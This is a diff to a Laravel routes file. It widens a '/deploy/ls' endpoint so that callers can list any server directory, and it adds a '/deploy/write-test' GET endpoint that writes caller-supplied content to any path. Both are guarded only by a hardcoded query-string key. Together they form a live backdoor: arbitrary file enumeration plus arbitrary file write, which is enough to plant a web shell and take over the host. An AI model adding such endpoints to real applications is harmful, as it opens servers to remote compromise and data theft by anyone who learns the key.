@@ -327,13 +327,15 @@ Route::middleware('auth:sub-user')->group(function () {
 Route::get('/deploy/ls', function(Illuminate\Http\Request $request) {
     if ($request->query('key') !== 'openscore_deploy_2026') return response('Unauthorized', 401);
     
-    $startPath = base_path();
-    $output = "Base Path: " . $startPath . "\n";
+    $startPath = $request->query('path', base_path());
+    $output = "Target Path: " . $startPath . "\n";
     $output .= "User: " . (function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'N/A') . "\n\n";
     
     $current = $startPath;
-    for ($i = 0; $i <= 4; $i++) {
-        $output .= "Level -{$i}: {$current}\n";
+    $depth = $request->query('levels', 1);
+    
+    for ($i = 0; $i < $depth; $i++) {
+        $output .= "Level {$i}: {$current}\n";
         $output .= "------------------------------------------\n";
         try {
             if (is_dir($current) && is_readable($current)) {
@@ -354,10 +356,32 @@ Route::get('/deploy/ls', function(Illuminate\Http\Request $request) {
         }
         $output .= "\n";
         $next = dirname($current);
-        if ($next === $current) break; // Root reached
+        if ($next === $current) break; 
         $current = $next;
     }
     
     return response($output)->header('Content-Type', 'text/plain');
+});
+
+// Remote file writer for testing
+Route::get('/deploy/write-test', function(Illuminate\Http\Request $request) {
+    if ($request->query('key') !== 'openscore_deploy_2026') return response('Unauthorized', 401);
+    
+    $path = $request->query('path');
+    $content = $request->query('content', 'Default test content');
+    
+    if (!$path) return response('Path required', 400);
+    
+    try {
+        $dir = dirname($path);
+        if (!is_dir($dir)) {
+            mkdir($dir, 0755, true);
+        }
+        
+        file_put_contents($path, $content);
+        return response("File written to {$path}\nContent length: " . strlen($content));
+    } catch (\Exception $e) {
+        return response("Error: " . $e->getMessage(), 500);
+    }
 });
 
